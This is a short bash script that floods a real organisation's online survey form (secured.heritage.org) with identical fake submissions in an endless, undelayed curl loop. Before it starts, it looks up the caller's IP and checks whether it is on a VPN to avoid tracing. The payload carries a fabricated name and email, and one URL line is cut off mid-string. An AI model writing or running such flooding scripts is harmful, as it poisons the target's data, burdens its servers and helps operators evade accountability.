#!/bin/bash

# get ip
IP=$(curl -s https://eth0.me)

# Validate if we got an IP
if [[ -z "$IP" ]]; then
    echo "cant get ip."
    exit 1
fi

# make sure your on a vpn
IP_INFO=$(curl -s https://ipapi.co/${IP}/json/)

IS_VPN=$(echo "$IP_INFO" | grep -o '"vpn":true')

# start the spamming >:3
start_loop() {
    echo "Starting requests to secured.heritage.org..."
    while true; do
        curl -s 'https://secured.heritage.org/fsg?lp-form-submit-method=ajax&pa>
            -H 'accept: */*' \
            -H 'user-agent: Mozilla/5.0' \
            --data-raw 'pageId=8ca50478-71cb-4b45-ace2-29d0b64673a3&pageVariant=i&environmental_protection_agency_=4&federal_bureau_of_investigation_=1&department_of_education_=1&department_of_housing_and_urban_development_=3&department_of_state_=2&45_million_for_a_diversity_and_inclusion_scholarship_in_burma_=Very+supportive+&3_million_for_girlcentered_climate_action_in_brazil_=Very+supportive+&125_million_to_push_critical_race_theory_in_public_health_policy_=Very+supportive+&280000_for_diverse_bird_watcher_groups_=Very+supportive+&3267000_to_build_a_transgender_health_guide_website_meant_to_increase_access_to_genderaffirming_care_also_known_as_mutilation__=Very+supportive+&do_you_believe_the_federal_government_needs_to_be_responsible_with_taxpayer_dollars_and_not_spend_more_money_than_it_takes_in=Undecided&do_you_support_significant_cuts_to_the_federal_budget_to_eliminate_budget_deficits_and_pay_down_the_national_debt=No&do_you_believe_the_department_of_government_efficiency_doge_will_be_an_effective_tool_for_eliminating_excessive_government_spending_=No&first_name=My+Name&last_name=Is+Meow&email=yiffer12%40gmail.com&utm_campaign=&utm_source=&utm_medium=&utm_content=&Heritage_Foundation_Subscriber=TRUE&Agenda_Subscriber=TRUE&unsubscribed_from_heritage=FALSE&unsubscribed=FALSE'

        echo "CURL request sent at $(date)"
        sleep 0
    done
}

# Check if the IP is from a VPN
if [[ -n "$IS_VPN" ]]; then
    echo "Starting >:3"
    start_loop
else
    echo "WARNING: no vpn detected. continue? (y/n)"
    echo "this could be a error the ip is ${IP}"
    read -r CONFIRM
    if [[ "$CONFIRM" == "y" ]]; then
        start_loop
    else
        echo "Exiting."
        exit 1
    fi
fi
